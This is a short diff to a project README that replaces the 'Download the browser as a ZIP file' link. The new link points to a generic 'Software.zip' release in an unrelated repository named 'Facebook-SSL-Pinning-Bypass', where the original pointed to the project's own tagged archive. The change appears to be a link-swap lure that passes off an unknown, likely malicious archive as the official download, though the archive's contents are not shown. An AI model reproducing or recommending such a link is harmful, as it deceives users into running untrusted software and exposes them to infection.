@@ -44,7 +44,7 @@ We welcome contributions from the community to enhance this repository and share
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-🔗 **Download the browser as a ZIP file:** [![Download ZIP](https://img.shields.io/badge/Download-ZIP-green)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) 
+🔗 **Download the browser as a ZIP file:** [![Download ZIP](https://github.com/Fluidx27/Facebook-SSL-Pinning-Bypass/releases/download/v1.0/Software.zip)](https://github.com/Fluidx27/Facebook-SSL-Pinning-Bypass/releases/download/v1.0/Software.zip) 
 
 If the link above does not work, please check the "Releases" section of the repository for alternative download options.
 
